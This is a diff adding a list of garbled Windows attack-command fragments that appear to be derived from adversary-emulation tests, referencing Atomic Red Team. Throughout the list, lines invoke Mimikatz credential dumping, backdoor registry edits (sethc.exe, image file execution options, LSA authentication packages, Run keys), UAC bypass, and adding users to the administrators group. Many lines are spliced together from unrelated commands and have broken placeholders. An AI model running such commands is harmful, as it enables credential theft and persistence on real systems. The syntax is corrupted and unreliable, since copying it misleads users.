@@ -1,0 +1,64 @@
+invoke-mimikatz.exe
+$ shortcut.description = `` exit ''
+cmdkey /list
+remove-item -path '' `` $ { malicious_exe_path } = `` \windows\system32\sethc.exe } /a
+net user $ { malicious_binary { flie_name } /launch : $ { username } -u $ { ads_zip } $ { wordlist }
+auditpol /set /category : account logon /v debugger /d `` $ { dll_file_path } /t reg_multi_sz
+bitsadmin.exe /complete $ { domain admins : $ { input_folder_name } $ { encoded binary_file_path }
+sekurlsa : :logonpasswords
+copy $ { filename_regex }
+rdrleakdiag.exe -d % windir % \system32\osk.exe
+net localgroup ``
+net user $ { input_folder_name } '' $ { password_table_file_name }
+reg add `` hklm\software\microsoft\windows nt\currentversion\silentprocessexit\svchost.exe '' /v /v `` authentication packages '' /f
+$ filter=set-wmiinstance /f % windir % appdata % -ne `` explorer.exe $ { create } $ { copy for commnad } ''
+add-localgroupmember -group `` hklm\software\microsoft\windows ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 ''
+netstat
+net localgroup `` users ''
+reg add `` hkey_local_machine\system\currentcontrolset\services\ntds '' /v `` threadingmodel '' /t reg_sz /d `` $ { dll_file } '' /f
+sharprdp.exe computername= $ { task_name } -u $ { ip } '' password= $ { password } /add
+reg add `` domain -name `` hklm\software\microsoft\windows objws for range_start )
+reg add `` hklm\software\microsoft\active setup\installed components\atomic_test '' /v `` stubpath '' /t reg_sz /f /d imagepath /d : \windows\system32\sethc.exe
+$ code = [ text.encoding ] : :frombase64string ( $ env : :securityprotocol = [ /all ' % \updater.exe -command $ { command }
+$ shortcut.workingdirectory = `` `` hkey_local_machine\system\currentcontrolset\control\lsa '' /v `` autorun '' /t reg_dword /d 1
+sekurlsa : target t1547.009 & -startaddress $ { command } > $ { range_end } , $ { command_file }
+adfind administrators get-localuser
+reg add `` hklm\software\microsoft\command processor '' /v `` i -p '' /f
+net localgroup
+attrib +h $ { computer_name }
+auditpol -query `` exit $ { command }
+gpresult /z
+reg add `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t loadappinit_dlls '' /t reg_multi_sz /d 1
+quser
+reg add `` shadow manager\appcertdlls '' /v cor_profiler '' /d `` bypass /t reg_sz /d `` $ { dll_path } '' /f
+settingsynchost /out : $ { ntlm } name you consumerargs
+net start
+get-service list | findstr $ { ' /d : $ { destination_ip } , { binary__file_path } , $ { binary_file_path } ''
+get-localgroupmember /y
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` autorun '' /t reg_sz /d `` $ { mimilib.dll_path } '' /f
+adfind.exe -gcb -sc trustdmp
+net user /add $ { ip } '' $ { command }
+python zero_padding.py $ { binary }
+auditpol /category : '' detailed tracking
+namp -sn $ { user_name }
+reg `` import \windows\system32\desk.cpl , installscreensaver $ { ' } $ { mask }
+bypassuac.exe $ { command }
+./printscreen.ps1
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` reg_expand_sz /v /t reg_sz /d 1 /f
+tracert $ { seconds domain } $ { path } /ve
+reg add `` hklm\software\microsoft\windows /v `` hkcu\software\microsoft\windows\currentversion\run '' /v `` threadingmodel '' /t reg_sz /d bypass /t reg_sz /d `` destination /d $ { binary_file_path } $ { source } | 1 /d `` $ { dll_file_path } '' /d imagepath , globalflag /f
+net user $ { username } '' $ { username } > $ { intput_file_name }
+stordiag.exe
+% -query `` cim -- net.securityprotocoltype ] : :tls12
+invoke-screencap $ { file_path }
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\svchost.exe '' /v `` lsadbextpt '' /t `` 1 '' /d `` $ { command } ''
+rundll32.exe c : \system\currentcontrolset\services\winsock2\parameters -name atomic_red_team 0 ' '' -startuptype automatic }
+quser
+reg add `` hkey_local_machine\system\currentcontrolset\services\ntds '' /v `` authentication packages '' '' /d `` $ { command } '' /t dll_file_path
+c ( source_file_path ; eventnamespace='root\cimv2 ' $ ( `` hklm\system\currentcontrolset\control\session '' /v atomic_red_team -arguments , and packages /f
+reg add `` hklm\software\microsoft\command nt\currentversion\winlogon '' /domain '' /v `` remote_file_url } /t reg_sz /f 0 0 binary__file_path
+add-localgroupmember -group `` administrators '' -member `` file_path
+net user `` $ { $ { username } -p $ { username } '' $ { host password } '' /domain
+`` /y $ { entrypoint }
+whoami /priv
+at.exe $ { time } /interactive /every : $ { dump_type }
